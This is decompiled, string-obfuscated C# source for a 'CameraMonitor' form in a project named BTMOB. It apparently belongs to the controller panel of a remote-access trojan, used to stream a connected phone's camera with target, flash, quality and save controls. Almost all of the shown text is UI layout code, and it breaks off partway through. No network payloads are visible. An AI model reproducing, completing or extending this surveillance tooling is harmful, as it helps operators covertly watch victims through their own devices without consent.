using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using BTMOB.My.Resources;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace BTMOB;

[DesignerGenerated]
public class CameraMonitor : basestyle
{
	public delegate void addsizedele(object[] objs);

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Panel3")]
	private Panel _Panel3;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("stopbtn")]
	private DrakeUIButtonIcon _stopbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("startbtn")]
	private DrakeUIButtonIcon _startbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon1")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Button3")]
	private DrakeUIButtonIcon _Button3;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("savetimer")]
	private System.Windows.Forms.Timer _savetimer;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("statetimer")]
	private System.Windows.Forms.Timer _statetimer;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("flashbtn")]
	private DrakeUIButtonIcon _flashbtn;

	public Bitmap _latestFrame;

	public object _frameLock;

	private int _lastRenderTick;

	public const int TargetFrameMs = 33;

	public BTClient Btcli;

	public int FPS;

	private WebSocketClient websockclient;

	public string KEYsx;

	private Dictionary<string, RotateFlipType> RotateFlipMap;

	public bool boSave;

	public bool newphoto;

	[field: AccessedThroughProperty("viewimage")]
	internal virtual PictureBox viewimage
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Panel Panel3
	{
		[CompilerGenerated]
		get
		{
			return _Panel3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			PaintEventHandler value2 = Panel3_Paint;
			Panel panel = _Panel3;
			if (panel != null)
			{
				panel.Paint -= value2;
			}
			_Panel3 = value;
			panel = _Panel3;
			if (panel != null)
			{
				panel.Paint += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon stopbtn
	{
		[CompilerGenerated]
		get
		{
			return _stopbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = stopbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _stopbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_stopbtn = value;
			drakeUIButtonIcon = _stopbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon startbtn
	{
		[CompilerGenerated]
		get
		{
			return _startbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = startbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _startbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_startbtn = value;
			drakeUIButtonIcon = _startbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("comboTargts")]
	internal virtual DrakeUIComboBox comboTargts
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("mainstatelabel")]
	internal virtual Label mainstatelabel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("combosizes")]
	internal virtual DrakeUIComboBox combosizes
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel4")]
	internal virtual Panel Panel4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon1_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon1 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon Button3
	{
		[CompilerGenerated]
		get
		{
			return _Button3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon2_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _Button3;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_Button3 = value;
			drakeUIButtonIcon = _Button3;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W11")]
	internal virtual DrakeWidth_W DrakeWidth_W11
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual System.Windows.Forms.Timer savetimer
	{
		[CompilerGenerated]
		get
		{
			return _savetimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = savetimer_Tick;
			System.Windows.Forms.Timer timer = _savetimer;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_savetimer = value;
			timer = _savetimer;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	internal virtual System.Windows.Forms.Timer statetimer
	{
		[CompilerGenerated]
		get
		{
			return _statetimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = statetimer_Tick;
			System.Windows.Forms.Timer timer = _statetimer;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_statetimer = value;
			timer = _statetimer;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W3")]
	internal virtual DrakeWidth_W DrakeWidth_W3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("qualitydrop")]
	internal virtual DrakeUIComboBox qualitydrop
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W4")]
	internal virtual DrakeWidth_W DrakeWidth_W4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon flashbtn
	{
		[CompilerGenerated]
		get
		{
			return _flashbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon2_Click_1;
			DrakeUIButtonIcon drakeUIButtonIcon = _flashbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_flashbtn = value;
			drakeUIButtonIcon = _flashbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W9")]
	internal virtual DrakeWidth_W DrakeWidth_W9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W10")]
	internal virtual DrakeWidth_W DrakeWidth_W10
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W2")]
	internal new virtual DrakeWidth_W DrakeWidth_W2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BTMOB.CameraMonitor));
		this.viewimage = new System.Windows.Forms.PictureBox();
		this.Panel3 = new System.Windows.Forms.Panel();
		this.stopbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W3 = new DrakeUI.Framework.DrakeWidth_W();
		this.startbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.flashbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W9 = new DrakeUI.Framework.DrakeWidth_W();
		this.Button3 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W11 = new DrakeUI.Framework.DrakeWidth_W();
		this.DrakeUIButtonIcon1 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W10 = new DrakeUI.Framework.DrakeWidth_W();
		this.comboTargts = new DrakeUI.Framework.DrakeUIComboBox();
		this.DrakeWidth_W4 = new DrakeUI.Framework.DrakeWidth_W();
		this.combosizes = new DrakeUI.Framework.DrakeUIComboBox();
		this.qualitydrop = new DrakeUI.Framework.DrakeUIComboBox();
		this.mainstatelabel = new System.Windows.Forms.Label();
		this.Panel4 = new System.Windows.Forms.Panel();
		this.savetimer = new System.Windows.Forms.Timer(this.components);
		this.statetimer = new System.Windows.Forms.Timer(this.components);
		this.Panel2 = new System.Windows.Forms.Panel();
		this.DrakeWidth_W2 = new DrakeUI.Framework.DrakeWidth_W();
		((System.ComponentModel.ISupportInitialize)this.myscr).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.myico).BeginInit();
		this.tobpanelsti.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.viewimage).BeginInit();
		this.Panel3.SuspendLayout();
		this.Panel4.SuspendLayout();
		this.Panel2.SuspendLayout();
		base.SuspendLayout();
		this.pinbtn.Location = new System.Drawing.Point(316, 5);
		this.minibtn.Location = new System.Drawing.Point(358, 5);
		this.closbtn.Location = new System.Drawing.Point(400, 5);
		this.mytitle.Location = new System.Drawing.Point(5, 4);
		this.mytitle.Size = new System.Drawing.Size(432, 16);
		this.tobpanelsti.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.tobpanelsti.Size = new System.Drawing.Size(442, 24);
		this.viewimage.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.viewimage.Dock = System.Windows.Forms.DockStyle.Fill;
		this.viewimage.Location = new System.Drawing.Point(2, 141);
		this.viewimage.Name = EXGuarder._516A522F;
		this.viewimage.Size = new System.Drawing.Size(442, 234);
		this.viewimage.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.viewimage.TabIndex = 40;
		this.viewimage.TabStop = false;
		this.Panel3.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel3.Controls.Add(this.stopbtn);
		this.Panel3.Controls.Add(this.DrakeWidth_W3);
		this.Panel3.Controls.Add(this.startbtn);
		this.Panel3.Controls.Add(this.flashbtn);
		this.Panel3.Controls.Add(this.DrakeWidth_W9);
		this.Panel3.Controls.Add(this.Button3);
		this.Panel3.Controls.Add(this.DrakeWidth_W11);
		this.Panel3.Controls.Add(this.DrakeUIButtonIcon1);
		this.Panel3.Controls.Add(this.DrakeWidth_W10);
		this.Panel3.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel3.Location = new System.Drawing.Point(2, 62);
		this.Panel3.Name = EXGuarder._71212772;
		this.Panel3.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.Panel3.Size = new System.Drawing.Size(442, 46);
		this.Panel3.TabIndex = 41;
		this.stopbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.stopbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.stopbtn.Enabled = false;
		this.stopbtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.stopbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.stopbtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.stopbtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.stopbtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.stopbtn.Font = new System.Drawing.Font(EXGuarder._21690704, 9f);
		this.stopbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.stopbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.stopbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.stopbtn.Location = new System.Drawing.Point(307, 4);
		this.stopbtn.Name = EXGuarder._4B694457;
		this.stopbtn.Radius = 15;
		this.stopbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.stopbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.stopbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.stopbtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.stopbtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.stopbtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Bottom;
		this.stopbtn.Size = new System.Drawing.Size(54, 38);
		this.stopbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.stopbtn.Symbol = 61516;
		this.stopbtn.SymbolSize = 18;
		this.stopbtn.TabIndex = 8;
		this.DrakeWidth_W3.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W3.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeWidth_W3.Location = new System.Drawing.Point(361, 4);
		this.DrakeWidth_W3.Name = EXGuarder._1D6B2E63;
		this.DrakeWidth_W3.Size = new System.Drawing.Size(22, 38);
		this.DrakeWidth_W3.TabIndex = 12;
		this.startbtn.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.startbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.startbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.startbtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.startbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.startbtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.startbtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.startbtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.startbtn.Font = new System.Drawing.Font(EXGuarder._21690704, 9f);
		this.startbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.startbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.startbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.startbtn.Location = new System.Drawing.Point(383, 4);
		this.startbtn.Name = EXGuarder._48744C3A;
		this.startbtn.Radius = 15;
		this.startbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.startbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.startbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.startbtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.startbtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.startbtn.Size = new System.Drawing.Size(54, 38);
		this.startbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.startbtn.Symbol = 61515;
		this.startbtn.SymbolSize = 18;
		this.startbtn.TabIndex = 7;
		this.flashbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.flashbtn.Dock = System.Windows.Forms.DockStyle.Left;
		this.flashbtn.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.flashbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.flashbtn.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.flashbtn.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.flashbtn.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.flashbtn.Font = new System.Drawing.Font(EXGuarder._21690704, 9f);
		this.flashbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.flashbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.flashbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.flashbtn.Location = new System.Drawing.Point(126, 4);
		this.flashbtn.Name = EXGuarder._3A1C0802;
		this.flashbtn.Radius = 15;
		this.flashbtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.flashbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.flashbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.flashbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.flashbtn.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.flashbtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.flashbtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.flashbtn.Size = new System.Drawing.Size(41, 38);
		this.flashbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.flashbtn.Symbol = 61671;
		this.flashbtn.SymbolSize = 20;
		this.flashbtn.TabIndex = 13;
		this.flashbtn.Tag = EXGuarder._5B3A0D29;
		this.DrakeWidth_W9.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W9.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeWidth_W9.Location = new System.Drawing.Point(113, 4);
		this.DrakeWidth_W9.Name = EXGuarder._07050009;
		this.DrakeWidth_W9.Size = new System.Drawing.Size(13, 38);
		this.DrakeWidth_W9.TabIndex = 12;
		this.Button3.Cursor = System.Windows.Forms.Cursors.Hand;
		this.Button3.Dock = System.Windows.Forms.DockStyle.Left;
		this.Button3.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Button3.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Button3.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Button3.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Button3.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Button3.Font = new System.Drawing.Font(EXGuarder._21690704, 9f);
		this.Button3.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.Button3.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.Button3.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.Button3.Location = new System.Drawing.Point(72, 4);
		this.Button3.Name = EXGuarder._3B3B0420;
		this.Button3.Radius = 15;
		this.Button3.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.Button3.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.Button3.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.Button3.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.Button3.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.Button3.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.Button3.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.Button3.Size = new System.Drawing.Size(41, 38);
		this.Button3.Style = DrakeUI.Framework.UIStyle.Custom;
		this.Button3.Symbol = 57572;
		this.Button3.SymbolSize = 20;
		this.Button3.TabIndex = 11;
		this.Button3.Tag = EXGuarder._5B3A0D29;
		this.DrakeWidth_W11.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W11.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeWidth_W11.Location = new System.Drawing.Point(59, 4);
		this.DrakeWidth_W11.Name = EXGuarder._2B176D78;
		this.DrakeWidth_W11.Size = new System.Drawing.Size(13, 38);
		this.DrakeWidth_W11.TabIndex = 10;
		this.DrakeUIButtonIcon1.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon1.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeUIButtonIcon1.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon1.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon1.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon1.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon1.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon1.Font = new System.Drawing.Font(EXGuarder._21690704, 9f);
		this.DrakeUIButtonIcon1.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.DrakeUIButtonIcon1.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.DrakeUIButtonIcon1.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.DrakeUIButtonIcon1.Location = new System.Drawing.Point(18, 4);
		this.DrakeUIButtonIcon1.Name = EXGuarder._31307169;
		this.DrakeUIButtonIcon1.Radius = 15;
		this.DrakeUIButtonIcon1.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.DrakeUIButtonIcon1.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.DrakeUIButtonIcon1.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon1.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.DrakeUIButtonIcon1.RectPressColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.DrakeUIButtonIcon1.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.DrakeUIButtonIcon1.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.DrakeUIButtonIcon1.Size = new System.Drawing.Size(41, 38);
		this.DrakeUIButtonIcon1.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon1.Symbol = 61470;
		this.DrakeUIButtonIcon1.SymbolSize = 20;
		this.DrakeUIButtonIcon1.TabIndex = 9;
		this.DrakeWidth_W10.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W10.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeWidth_W10.Location = new System.Drawing.Point(5, 4);
		this.DrakeWidth_W10.Name = EXGuarder._52067700;
		this.DrakeWidth_W10.Size = new System.Drawing.Size(13, 38);
		this.DrakeWidth_W10.TabIndex = 14;
		this.comboTargts.Dock = System.Windows.Forms.DockStyle.Left;
		this.comboTargts.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.comboTargts.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.comboTargts.Font = new System.Drawing.Font(EXGuarder._21690704, 9f, System.Drawing.FontStyle.Bold);
		this.comboTargts.ForeColor = System.Drawing.Color.White;
		this.comboTargts.Items.AddRange(new object[2]
		{
			EXGuarder._17211F76,
			EXGuarder._0C476E6E
		});
		this.comboTargts.Location = new System.Drawing.Point(101, 5);
		this.comboTargts.Margin = new System.Windows.Forms.Padding(4);
		this.comboTargts.MinimumSize = new System.Drawing.Size(56, 0);
		this.comboTargts.Name = EXGuarder._3721225E;
		this.comboTargts.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.comboTargts.Radius = 15;
		this.comboTargts.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.comboTargts.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.comboTargts.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.comboTargts.Size = new System.Drawing.Size(138, 25);
		this.comboTargts.Style = DrakeUI.Framework.UIStyle.Custom;
		this.comboTargts.StyleCustomMode = true;
		this.comboTargts.TabIndex = 9;
		this.comboTargts.Text = EXGuarder._17211F76;
		this.comboTargts.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.DrakeWidth_W4.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W4.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeWidth_W4.Location = new System.Drawing.Point(239, 5);
		this.DrakeWidth_W4.Name = EXGuarder._352A6968;
		this.DrakeWidth_W4.Size = new System.Drawing.Size(9, 23);
		this.DrakeWidth_W4.TabIndex = 13;
		this.combosizes.Dock = System.Windows.Forms.DockStyle.Left;
		this.combosizes.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.combosizes.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.combosizes.Font = new System.Drawing.Font(EXGuarder._21690704, 9f, System.Drawing.FontStyle.Bold);
		this.combosizes.ForeColor = System.Drawing.Color.White;
		this.combosizes.Location = new System.Drawing.Point(248, 5);
		this.combosizes.Margin = new System.Windows.Forms.Padding(4);
		this.combosizes.MinimumSize = new System.Drawing.Size(56, 0);
		this.combosizes.Name = EXGuarder._3A444213;
		this.combosizes.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.combosizes.Radius = 15;
		this.combosizes.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.combosizes.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.combosizes.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.combosizes.Size = new System.Drawing.Size(138, 25);
		this.combosizes.Style = DrakeUI.Framework.UIStyle.Custom;
		this.combosizes.StyleCustomMode = true;
		this.combosizes.TabIndex = 10;
		this.combosizes.Text = EXGuarder._1745205C;
		this.combosizes.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.qualitydrop.Dock = System.Windows.Forms.DockStyle.Left;
		this.qualitydrop.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.qualitydrop.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.qualitydrop.Font = new System.Drawing.Font(EXGuarder._21690704, 8f);
		this.qualitydrop.ForeColor = System.Drawing.Color.White;
		this.qualitydrop.Items.AddRange(new object[18]
		{
			EXGuarder._1B491F40,
			EXGuarder._1B703B2B,
			EXGuarder._3D4E6033,
			EXGuarder._314F6347,
			EXGuarder._5D005F32,
			EXGuarder._03260743,
			EXGuarder._12133077,
			EXGuarder._5D3F3517,
			EXGuarder._0F1A4D06,
			EXGuarder._4D720862,
			EXGuarder._4806302B,
			EXGuarder._00791415,
			EXGuarder._41001A0B,
			EXGuarder._03025F03,
			EXGuarder._5604670A,
			EXGuarder._6D5B6C56,
			EXGuarder._77164E68,
			EXGuarder._5E4C6018
		});
		this.qualitydrop.Location = new System.Drawing.Point(6, 5);
		this.qualitydrop.Margin = new System.Windows.Forms.Padding(4);
		this.qualitydrop.MinimumSize = new System.Drawing.Size(56, 0);
		this.qualitydrop.Name = EXGuarder._1437242C;
		this.qualitydrop.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.qualitydrop.Radius = 15;
		this.qualitydrop.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.qualitydrop.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.qualitydrop.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.qualitydrop.Size = new System.Drawing.Size(85, 23);
		this.qualitydrop.Style = DrakeUI.Framework.UIStyle.Custom;
		this.qualitydrop.StyleCustomMode = true;
		this.qualitydrop.TabIndex = 14;
		this.qualitydrop.Text = EXGuarder._03260743;
		this.qualitydrop.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.mainstatelabel.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.mainstatelabel.Dock = System.Windows.Forms.DockStyle.Fill;
		this.mainstatelabel.Font = new System.Drawing.Font(EXGuarder._21690704, 7.5f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.mainstatelabel.ForeColor = System.Drawing.Color.White;
		this.mainstatelabel.Location = new System.Drawing.Point(4, 4);
		this.mainstatelabel.Name = EXGuarder._6372560B;
		this.mainstatelabel.Size = new System.Drawing.Size(434, 24);
		this.mainstatelabel.TabIndex = 1;
		this.mainstatelabel.Text = EXGuarder._032C5542;
		this.mainstatelabel.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.Panel4.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel4.Controls.Add(this.mainstatelabel);
		this.Panel4.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Panel4.Location = new System.Drawing.Point(2, 375);
		this.Panel4.Name = EXGuarder._1435032A;
		this.Panel4.Padding = new System.Windows.Forms.Padding(4);
		this.Panel4.Size = new System.Drawing.Size(442, 32);
